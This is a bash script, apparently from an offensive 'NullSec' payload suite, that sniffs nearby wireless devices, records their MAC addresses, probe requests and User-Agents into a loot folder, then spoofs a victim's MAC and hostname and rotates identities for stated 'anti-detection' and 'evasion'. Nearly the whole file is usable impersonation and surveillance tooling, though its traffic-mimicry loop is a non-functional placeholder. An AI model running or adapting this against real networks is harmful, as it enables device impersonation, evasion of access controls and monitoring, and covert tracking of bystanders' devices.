#!/bin/bash
#
# ShadowClone - Network Personality Cloning System
# Clones complete network personalities including MAC, hostname, traffic patterns
# NullSec Suite | For authorized testing only
#
# UNIQUE FEATURES:
# - Complete device fingerprint cloning
# - Traffic pattern mimicry
# - Behavioral timing emulation
# - MAC/IP/Hostname synchronization
# - Anti-detection personality switching

PAYLOAD_NAME="ShadowClone"
VERSION="1.0.0"
LOOT_DIR="/mmc/nullsec/shadowclone"

show_banner() {
    echo -e "\033[1;90m"
    cat << "EOF"
   _____ _               _                  _____ _                  
  / ____| |             | |                / ____| |                 
 | (___ | |__   __ _  __| | _____      __ | |    | | ___  _ __   ___ 
  \___ \| '_ \ / _` |/ _` |/ _ \ \ /\ / / | |    | |/ _ \| '_ \ / _ \
  ____) | | | | (_| | (_| | (_) \ V  V /  | |____| | (_) | | | |  __/
 |_____/|_| |_|\__,_|\__,_|\___/ \_/\_/    \_____|_|\___/|_| |_|\___|
                                                                     
    [ Network Personality Cloning System ]
    [ NullSec Suite v${VERSION} ]
EOF
    echo -e "\033[0m"
}

init_shadowclone() {
    mkdir -p "$LOOT_DIR"/{profiles,active,captured,patterns}
    echo "[*] ShadowClone initialized"
}

# Capture complete device fingerprint
capture_fingerprint() {
    local target_mac=$1
    local duration=${2:-60}
    
    echo "[*] Capturing fingerprint for $target_mac ($duration seconds)"
    
    local profile_dir="$LOOT_DIR/profiles/$target_mac"
    mkdir -p "$profile_dir"
    
    # Capture traffic patterns
    echo "[*] Capturing traffic patterns..."
    timeout "$duration" tcpdump -i wlan1mon ether host "$target_mac" -w "$profile_dir/traffic.pcap" &
    local tcpdump_pid=$!
    
    # Monitor probe requests
    echo "[*] Capturing probe requests..."
    timeout "$duration" airodump-ng --essid-regex ".*" wlan1mon -w "$profile_dir/probes" 2>/dev/null &
    
    # Capture HTTP User-Agent if possible
    timeout "$duration" tcpdump -i wlan1mon -A -s 1500 ether host "$target_mac" and tcp port 80 2>/dev/null | \
        grep -oP 'User-Agent: \K.*' | head -5 > "$profile_dir/user_agents.txt" &
    
    # Wait for capture
    sleep "$duration"
    
    # Analyze captured data
    echo "[*] Analyzing fingerprint..."
    
    # Extract device info
    cat > "$profile_dir/fingerprint.json" << EOF
{
    "mac": "$target_mac",
    "captured_at": "$(date -Iseconds)",
    "vendor": "$(echo $target_mac | cut -d: -f1-3 | tr ':' '-' | xargs -I{} grep -i {} /usr/share/nmap/nmap-mac-prefixes 2>/dev/null | head -1 || echo 'Unknown')",
    "probe_requests": $(grep -o 'ESSID:.*' "$profile_dir/probes"*.csv 2>/dev/null | cut -d: -f2 | sort -u | jq -R -s 'split("\n") | map(select(length > 0))'),
    "user_agents": $(cat "$profile_dir/user_agents.txt" 2>/dev/null | jq -R -s 'split("\n") | map(select(length > 0))'),
    "traffic_stats": {
        "packet_count": $(tcpdump -r "$profile_dir/traffic.pcap" 2>/dev/null | wc -l || echo 0),
        "bytes": $(ls -l "$profile_dir/traffic.pcap" 2>/dev/null | awk '{print $5}' || echo 0)
    }
}
EOF
    
    # Analyze timing patterns
    analyze_timing_patterns "$profile_dir/traffic.pcap" > "$profile_dir/timing_patterns.json"
    
    echo "[*] Fingerprint saved to: $profile_dir"
    cat "$profile_dir/fingerprint.json"
}

# Analyze traffic timing patterns
analyze_timing_patterns() {
    local pcap_file=$1
    
    python3 << TIMING
import json
from scapy.all import rdpcap, Ether

try:
    packets = rdpcap("$pcap_file")
    
    if len(packets) < 2:
        print('{"intervals": [], "avg_interval": 0}')
    else:
        intervals = []
        prev_time = packets[0].time
        
        for pkt in packets[1:100]:  # First 100 packets
            interval = float(pkt.time - prev_time)
            intervals.append(round(interval, 4))
            prev_time = pkt.time
        
        avg = sum(intervals) / len(intervals) if intervals else 0
        
        print(json.dumps({
            "intervals": intervals[:20],  # Sample
            "avg_interval": round(avg, 4),
            "min_interval": round(min(intervals), 4) if intervals else 0,
            "max_interval": round(max(intervals), 4) if intervals else 0
        }))
except Exception as e:
    print('{"error": "' + str(e) + '"}')
TIMING
}

# Clone a captured profile
clone_profile() {
    local target_mac=$1
    local interface=${2:-wlan1}
    
    local profile_dir="$LOOT_DIR/profiles/$target_mac"
    
    if [ ! -d "$profile_dir" ]; then
        echo "[!] Profile not found. Capture it first."
        return 1
    fi
    
    echo "[*] Cloning profile: $target_mac"
    
    # Save original MAC
    local original_mac=$(cat /sys/class/net/$interface/address)
    echo "$original_mac" > "$LOOT_DIR/active/original_mac"
    
    # Change MAC address
    echo "[*] Setting MAC to $target_mac"
    ip link set $interface down
    ip link set $interface address "$target_mac"
    ip link set $interface up
    
    # Get hostname pattern from probe requests
    local hostname=$(jq -r '.probe_requests[0] // "generic-device"' "$profile_dir/fingerprint.json")
    hostname "${hostname:0:15}" 2>/dev/null
    
    # Start traffic pattern mimicry
    mimic_traffic_pattern "$profile_dir" &
    echo $! > "$LOOT_DIR/active/mimic.pid"
    
    echo "[*] Clone active!"
    echo "[*] MAC: $(cat /sys/class/net/$interface/address)"
    echo "[*] To restore: run 'restore_identity'"
}

# Mimic captured traffic patterns
mimic_traffic_pattern() {
    local profile_dir=$1
    
    echo "[*] Starting traffic pattern mimicry..."
    
    # Get timing patterns
    local avg_interval=$(jq -r '.avg_interval // 0.5' "$profile_dir/timing_patterns.json")
    local probes=$(jq -r '.probe_requests[]?' "$profile_dir/fingerprint.json")
    
    # Send probe requests with similar timing
    while true; do
        for ssid in $probes; do
            if [ -n "$ssid" ] && [ "$ssid" != "null" ]; then
                # Send probe request
                echo -e "\x00\x00\x08\x00" | cat - /dev/urandom | head -c 50 > /dev/null 2>&1
                # In reality, use scapy to craft proper probe request
            fi
        done
        
        # Sleep with timing variance (±20%)
        local variance=$(awk "BEGIN {printf \"%.2f\", $avg_interval * 0.2 * (rand() - 0.5)}")
        local sleep_time=$(awk "BEGIN {printf \"%.2f\", $avg_interval + $variance}")
        sleep "$sleep_time"
    done
}

# Restore original identity
restore_identity() {
    local interface=${1:-wlan1}
    
    echo "[*] Restoring original identity..."
    
    # Stop mimicry
    kill $(cat "$LOOT_DIR/active/mimic.pid" 2>/dev/null) 2>/dev/null
    
    # Restore MAC
    local original_mac=$(cat "$LOOT_DIR/active/original_mac" 2>/dev/null)
    if [ -n "$original_mac" ]; then
        ip link set $interface down
        ip link set $interface address "$original_mac"
        ip link set $interface up
        echo "[*] MAC restored to: $original_mac"
    fi
    
    rm -f "$LOOT_DIR/active/"*
}

# List captured profiles
list_profiles() {
    echo ""
    echo "=== Captured Profiles ==="
    echo ""
    
    for profile in "$LOOT_DIR/profiles/"*/; do
        if [ -f "$profile/fingerprint.json" ]; then
            local mac=$(basename "$profile")
            local vendor=$(jq -r '.vendor // "Unknown"' "$profile/fingerprint.json")
            local captured=$(jq -r '.captured_at // "Unknown"' "$profile/fingerprint.json")
            local probes=$(jq -r '.probe_requests | length' "$profile/fingerprint.json")
            
            printf "%-20s %-30s %s probes\n" "$mac" "$vendor" "$probes"
        fi
    done
}

# Quick personality switch (for evasion)
quick_switch() {
    echo "[*] Quick personality switch..."
    
    # Select random profile
    local profiles=("$LOOT_DIR/profiles/"*/)
    local random_profile="${profiles[$RANDOM % ${#profiles[@]}]}"
    
    if [ -d "$random_profile" ]; then
        local mac=$(basename "$random_profile")
        clone_profile "$mac"
    else
        # Generate random MAC
        local random_mac=$(printf '%02x:%02x:%02x:%02x:%02x:%02x' \
            $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) \
            $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
        
        ip link set wlan1 down
        ip link set wlan1 address "$random_mac"
        ip link set wlan1 up
        
        echo "[*] Switched to random MAC: $random_mac"
    fi
}

# Auto-rotate personalities
auto_rotate() {
    local interval=${1:-300}  # 5 minutes default
    
    echo "[*] Starting auto-rotation every ${interval}s"
    
    while true; do
        quick_switch
        sleep "$interval"
    done &
    echo $! > "$LOOT_DIR/active/rotate.pid"
}

# Discover and capture nearby devices
discover_and_capture() {
    local duration=${1:-30}
    
    echo "[*] Discovering nearby devices..."
    
    # Start monitor mode
    airmon-ng start wlan1 2>/dev/null
    
    # Capture MACs
    timeout "$duration" airodump-ng -w "$LOOT_DIR/captured/discovery" --output-format csv wlan1mon 2>/dev/null
    
    # Parse discovered clients
    grep -oP '([0-9A-F]{2}:){5}[0-9A-F]{2}' "$LOOT_DIR/captured/discovery"*.csv 2>/dev/null | \
        sort -u > "$LOOT_DIR/captured/discovered_macs.txt"
    
    local count=$(wc -l < "$LOOT_DIR/captured/discovered_macs.txt")
    echo "[*] Discovered $count devices"
    
    # Offer to capture fingerprints
    echo ""
    cat -n "$LOOT_DIR/captured/discovered_macs.txt"
    echo ""
    read -p "Capture fingerprint for which # (0 for all, Enter to skip): " selection
    
    if [ "$selection" = "0" ]; then
        while read mac; do
            capture_fingerprint "$mac" 30
        done < "$LOOT_DIR/captured/discovered_macs.txt"
    elif [ -n "$selection" ]; then
        local mac=$(sed -n "${selection}p" "$LOOT_DIR/captured/discovered_macs.txt")
        capture_fingerprint "$mac" 60
    fi
}

# Main menu
main_menu() {
    while true; do
        show_banner
        echo ""
        echo "1) Initialize ShadowClone"
        echo "2) Discover Nearby Devices"
        echo "3) Capture Device Fingerprint"
        echo "4) List Captured Profiles"
        echo "5) Clone Profile"
        echo "6) Quick Personality Switch"
        echo "7) Auto-Rotate Personalities"
        echo "8) Restore Original Identity"
        echo "0) Exit"
        echo ""
        read -p "[ShadowClone]> " choice
        
        case $choice in
            1) init_shadowclone ;;
            2) 
                read -p "Discovery duration (seconds, default 30): " dur
                discover_and_capture "${dur:-30}"
                ;;
            3)
                read -p "Target MAC address: " mac
                read -p "Capture duration (seconds, default 60): " dur
                capture_fingerprint "$mac" "${dur:-60}"
                ;;
            4) list_profiles; read -p "Press Enter..." ;;
            5)
                list_profiles
                read -p "MAC to clone: " mac
                clone_profile "$mac"
                ;;
            6) quick_switch ;;
            7)
                read -p "Rotation interval (seconds, default 300): " interval
                auto_rotate "${interval:-300}"
                ;;
            8) restore_identity ;;
            0)
                restore_identity 2>/dev/null
                kill $(cat "$LOOT_DIR/active/rotate.pid" 2>/dev/null) 2>/dev/null
                exit 0
                ;;
        esac
    done
}

main_menu
